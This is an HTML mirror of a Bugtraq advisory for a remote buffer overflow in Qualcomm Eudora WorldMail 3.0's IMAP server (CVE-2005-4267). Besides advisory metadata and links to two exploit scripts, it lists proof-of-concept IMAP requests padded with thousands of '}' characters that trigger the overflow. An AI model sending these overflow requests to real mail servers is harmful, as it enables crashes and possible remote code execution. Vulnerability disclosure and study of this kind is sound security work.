@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid15980<p><b><span style="font-size: 18pt;">Qualcomm WorldMail IMAPD Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15980/info">info</a><br><a href="http://www.securityfocus.com/bid/15980/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15980/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15980/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15980/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15980
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-4267<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 20 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 07 2006 08:56PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Tim Shelton is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Qualcomm Eudora WorldMail Server 3.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x16000/15980/eudora_wmail.pl">#exploit_eudora_wmail.pl</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x16000/15980/Qualcomm-WorldMail-Overflow.py">#exploit_Qualcomm-WorldMail-Overflow.py</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<br/>The following proof of concept examples of IMAP requests are available: <br/>'02 LIST ""' + '}'x 5000 <br/>'03 LSUB ""' + '}'x 32762 <br/>'04 SEARCH TEXT ' + '}'x32762 <br/>'05 STATUS INBOX ' + '}'x32764 <br/>'02 AUTHENTICATE ' + '}'x32768 <br/>'02 FETCH 2:4 ' + '}'x10000 <br/>'02 SELECT ' + '}'x10000 <br/>'02 COPY 2:4 ' + '}'x32765 <br/><br/>The following exploit code is available: <br/> <br/>http://www.#no_exploit/data/vulnerabilities/exploits/eudora_wmail.pl
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/eudora_wmail.pl">/data/vulnerabilities/exploits/eudora_wmail.pl</a></li>
+<li><a href="/data/vulnerabilities/exploits/Qualcomm-WorldMail-Overflow.py">/data/vulnerabilities/exploits/Qualcomm-WorldMail-Overflow.py</a></li>
+</ul>
+</div>
